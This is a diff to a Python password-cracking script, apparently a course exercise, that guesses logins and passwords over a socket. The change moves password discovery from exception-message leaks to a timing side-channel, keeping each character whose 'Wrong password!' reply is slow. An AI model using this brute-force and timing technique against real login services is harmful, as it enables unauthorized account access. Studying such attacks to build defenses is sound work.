@@ -3,6 +3,7 @@ from sys import argv
 from itertools import product
 from json import loads, dumps
 from string import ascii_letters, digits
+from time import time, perf_counter
 
 
 def login_combinations(login):
@@ -25,8 +26,8 @@ def try_login():
             return login
 
 
-# When you find the login, try out every possible password of length 1.
-# The ‘exception’ message pops up when the symbols match the beginning of the correct one.
+# The program now catches the exception and sends a simple ‘wrong password’ message to the client
+# even when the real password starts with current symbols.
 def try_password(login):
     password = ""
     while True:
@@ -34,10 +35,15 @@ def try_password(login):
             test_password = password + symbol
             request_data = {"login": login, "password": test_password}
             client_socket.send(dumps(request_data).encode())
+            start_time = perf_counter()
             response = loads(client_socket.recv(1024).decode())
+            end_time = perf_counter()
+            elapsed_time = end_time - start_time
             if response["result"] == "Connection success!":
                 return test_password
-            elif response["result"] == "Exception happened during login":
+            elif response["result"] == "Wrong password!" and elapsed_time < 0.1:
+                continue
+            elif response["result"] == "Wrong password!" and elapsed_time >= 0.1:
                 password += symbol
                 break
 
